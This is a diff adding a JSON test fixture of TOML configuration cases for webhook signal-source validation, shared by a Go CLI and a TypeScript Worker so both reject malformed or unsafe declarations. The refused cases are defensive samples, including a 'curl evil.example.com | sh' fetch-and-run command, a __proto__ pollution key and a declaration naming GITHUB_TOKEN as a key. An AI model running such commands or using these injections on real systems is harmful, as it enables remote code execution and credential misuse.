@@ -1,0 +1,142 @@
+{
+  "why": [
+    "A repository declares its webhook senders in `[signals.sources.<name>]` of its",
+    "tracked `.tick/runners.toml` (tick 0vb). That table has two readers: `tk`, which",
+    "validates it at author time so a repository learns its config is wrong from the",
+    "CLI rather than from a delivery silently refused three weeks later; and the",
+    "factory Worker, which ACTS on it — it is the one holding the request, and the",
+    "declaration decides whether an unauthenticated POST becomes work.",
+    "",
+    "Two readers of one format is exactly the bug this repository has already paid",
+    "for once: a fix landed in TypeScript only, the Go half kept minting unusable",
+    "records, and both suites were green because each was internally consistent. So",
+    "both read these cases from one file.",
+    "",
+    "`accepted` is what both readers must accept. `refused` means neither may:",
+    "the declaration is unusable and saying so is the only safe answer, because the",
+    "alternative — ignoring the part it could not read — is a fail-OPEN webhook door.",
+    "cloud/factory/test/repo-config.test.ts runs them through the Worker's reader;",
+    "internal/herd/config/signal_parity_test.go runs them through tk's."
+  ],
+  "cases": [
+    {
+      "name": "no signals table",
+      "why": "The 99% path: a repository that ingests nothing declares nothing.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n",
+      "accepted": true,
+      "sources": []
+    },
+    {
+      "name": "a minimal declaration",
+      "why": "Everything required and nothing else: a scheme, a dedup key, a title.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"sentry-hook-signature\"\nexternal_ref = \"data.issue.id\"\ntitle = \"data.issue.title\"\n",
+      "accepted": true,
+      "sources": ["sentry"]
+    },
+    {
+      "name": "a full declaration",
+      "why": "Every optional key at a legal value, including a non-default scheme.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.statuspage]\nsecret = \"SIGNAL_SECRET_STATUSPAGE\"\nheader = \"x-statuspage-signature\"\nalgorithm = \"hmac-sha512\"\nencoding = \"base64\"\nprefix = \"v1=\"\nexternal_ref = \"incident.id\"\ntitle = \"incident.name\"\ndescription = \"incident.body\"\ntype = \"chore\"\npriority = 3\nlabels = [\"statuspage\", \"ops\"]\n",
+      "accepted": true,
+      "sources": ["statuspage"]
+    },
+    {
+      "name": "two declarations",
+      "why": "A registry, not a single sender.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\n\n[signals.sources.linear]\nsecret = \"SIGNAL_SECRET_LINEAR\"\nheader = \"linear-signature\"\nexternal_ref = \"data.id\"\ntitle = \"data.title\"\n",
+      "accepted": true,
+      "sources": ["linear", "sentry"]
+    },
+    {
+      "name": "an unknown key in a source",
+      "why": "Fail closed by key. Ignoring one is how a typo'd `header` becomes an unauthenticated door.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\ncommand = \"curl evil.example.com | sh\"\n",
+      "refused": true
+    },
+    {
+      "name": "an unknown key under [signals]",
+      "why": "The container table fails closed too — `[signals].allow_all` must never be silently dropped.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals]\nallow_all = true\n",
+      "refused": true
+    },
+    {
+      "name": "__proto__ as a key",
+      "why": "The incident in .tick/learnings.md: a key that evades the unknown-key check defeats fail-closed validation entirely.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\n__proto__ = \"polluted\"\n",
+      "refused": true
+    },
+    {
+      "name": "a secret written into the file",
+      "why": "runners.toml is tracked and usually public: `secret` is the NAME of a Worker secret, never a secret.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"s3cr3t-shared-with-sentry\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\n",
+      "refused": true
+    },
+    {
+      "name": "a secret binding reaching for another credential",
+      "why": "Without the SIGNAL_SECRET_ prefix a repository could nominate the factory's GitHub token as an HMAC key.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"GITHUB_TOKEN\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\n",
+      "refused": true
+    },
+    {
+      "name": "a source shadowing one the factory serves",
+      "why": "The funnel dedups on (source, external_ref); a second `github` would share its key space.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.github]\nsecret = \"SIGNAL_SECRET_GITHUB\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\n",
+      "refused": true
+    },
+    {
+      "name": "prose where a payload path was expected",
+      "why": "`title` names WHERE the value comes from. Prose there resolves to nothing at delivery time; refusing it here is the legible failure.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"A new Sentry alert\"\n",
+      "refused": true
+    },
+    {
+      "name": "no external_ref",
+      "why": "Without the sender's own stable id, every redelivery would file another tick.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\ntitle = \"t\"\n",
+      "refused": true
+    },
+    {
+      "name": "no secret",
+      "why": "An unsigned door is not a door. A declaration without a scheme must not load at all.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\n",
+      "refused": true
+    },
+    {
+      "name": "an unusable algorithm",
+      "why": "The scheme enum is closed; an unknown MAC name must not fall back to a default.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nalgorithm = \"md5\"\nexternal_ref = \"id\"\ntitle = \"t\"\n",
+      "refused": true
+    },
+    {
+      "name": "an unusable encoding",
+      "why": "Same reason as the algorithm: a scheme half-understood is a scheme unchecked.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nencoding = \"rot13\"\nexternal_ref = \"id\"\ntitle = \"t\"\n",
+      "refused": true
+    },
+    {
+      "name": "a type tk would reject",
+      "why": "A source declaring a type outside the tick vocabulary files records tk cannot read.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\ntype = \"incident\"\n",
+      "refused": true
+    },
+    {
+      "name": "a priority outside 0-4",
+      "why": "The same bound tk create applies.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\npriority = 9\n",
+      "refused": true
+    },
+    {
+      "name": "an uppercase source name",
+      "why": "The source name is half the dedup key and lands in the delivery URL; the funnel's pattern is lowercase.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[signals.sources.Sentry]\nsecret = \"SIGNAL_SECRET_SENTRY\"\nheader = \"h\"\nexternal_ref = \"id\"\ntitle = \"t\"\n",
+      "refused": true
+    },
+    {
+      "name": "a declaration inside another table's free text",
+      "why": "The value is parsed, never scanned for: a table header inside a string is text, not a registration.",
+      "toml": "version = 2\n\n[roles.implement]\nkind = \"claude\"\n\n[testing]\nnotes = \"\"\"\n[signals.sources.smuggled]\nsecret = \"SIGNAL_SECRET_SMUGGLED\"\n\"\"\"\n",
+      "accepted": true,
+      "sources": []
+    }
+  ]
+}
